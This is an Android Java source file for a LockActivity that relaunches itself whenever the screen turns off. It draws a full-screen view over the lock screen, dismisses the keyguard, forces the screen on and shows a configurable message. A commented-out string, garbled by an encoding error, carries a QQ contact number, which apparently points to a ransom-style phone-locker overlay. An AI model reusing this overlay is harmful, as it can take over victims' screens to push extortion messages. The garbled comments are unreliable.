package lock;

import util.ConfigCt;

import com.byc.wzry.R;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.SurfaceView;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;


public class LockActivity extends Activity {
	//private static final String LOCAK_SAY="�����ֻ��������繥����\n����ʱ������\n����ϵ�ͷ���\nQQ��1096754477\n����!\n���棺����οͷ�QQ�ţ�ǧ���������ֻ��������ֻ��ᱻ����������";
	public static LockActivity current;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
				| WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
				| WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
				| WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
		//setContentView(R.layout.activity_lock);
		 int LinearLayoutID=util.ResourceUtil.getLayoutId(getApplicationContext(), "activity_lock");
		LayoutInflater mlayoutInflater = LayoutInflater.from(getApplicationContext());
		View view = mlayoutInflater.inflate(LinearLayoutID, null);
		RelativeLayout.LayoutParams relLayoutParams=new RelativeLayout.LayoutParams
			        (RelativeLayout.LayoutParams.MATCH_PARENT,RelativeLayout.LayoutParams.MATCH_PARENT);
		this.addContentView(view,relLayoutParams);
		TextView tvSay = (TextView) view.findViewById(util.ResourceUtil.getId(getApplicationContext(), "tvShow"));
		//tvSay.setText(LOCAK_SAY);
		tvSay.setText(ConfigCt.lock_say);
		current=this;
	}
	  public static void LockReceiver(Context context){
	        final IntentFilter filter = new IntentFilter();
	        // ��Ļ�����㲥
	        filter.addAction(Intent.ACTION_SCREEN_OFF);
	        // ��Ļ�����㲥
	        filter.addAction(Intent.ACTION_SCREEN_ON);
	        // ��Ļ�����㲥
	        filter.addAction(Intent.ACTION_USER_PRESENT);
	        // ��������Դ���������ػ����Ի���������ʱϵͳ�ᷢ������㲥
	        // example����ʱ����õ�ϵͳ�Ի���Ȩ�޿��ܸܺߣ��Ḳ��������������ߡ��ػ����Ի���֮�ϣ�
	        // ���Լ�������㲥�����յ�ʱ�������Լ��ĶԻ�������pad���½ǲ��ֵ����ĶԻ���
	        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);

	        BroadcastReceiver mBatInfoReceiver = new BroadcastReceiver() {
	            @Override
	            public void onReceive(final Context context, final Intent intent) {
	                	Log.d(ConfigCt.TAG, "onReceive");
	                String action = intent.getAction();

	                if (Intent.ACTION_SCREEN_ON.equals(action)) {
	                    //if(mLockState==LockState.locked)ShowWindow();
	                    Log.d(ConfigCt.TAG, "screen on");
	                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
	                	//Funcs.wakeUpAndUnlock(context);
	                	LockActivity.startSelf(context);
	                    Log.d(ConfigCt.TAG, "screen off");
	                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
	                   // HideWindow();
	                   // mLockState=LockState.unLocked;
	                	LockActivity.current.finish();
	                    Log.d(ConfigCt.TAG, "screen unlock");
	                } else if (Intent.ACTION_CLOSE_SYSTEM_DIALOGS.equals(intent.getAction())) {
	                    Log.i(ConfigCt.TAG, " receive Intent.ACTION_CLOSE_SYSTEM_DIALOGS");
	                }
	            }
	        };
	        Log.d(ConfigCt.TAG, "registerReceiver");
	        context.registerReceiver(mBatInfoReceiver, filter);
	    }
	  public static void startSelf(Context context){
		  if(context==null){
			  if(current!=null){
				  current.finish();
				  current=null;
			  }
			  return;
		  }
		  Intent intent=new Intent(context,LockActivity.class);
		  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		  context.startActivity(intent);
	  }
	  @Override
	  protected void onDestroy(){
		  super.onDestroy();
		  current=null;
	  }
	  @Override
	    protected void onNewIntent(Intent intent) {
	        Log.i(ConfigCt.TAG, "ct LockActivity onNewIntent: ����");
	        PowerManager pm = (PowerManager) this.getSystemService(Context.POWER_SERVICE);
	        if (!pm.isScreenOn()) {
	            //String msg = intent.getStringExtra("msg");
	            //textview.setText("���յ���Ϣ:" + msg);
	            //������Ļ
	            PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP |
	                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "bright");
	            wl.acquire();
	            wl.release();
	        }
	    }
}
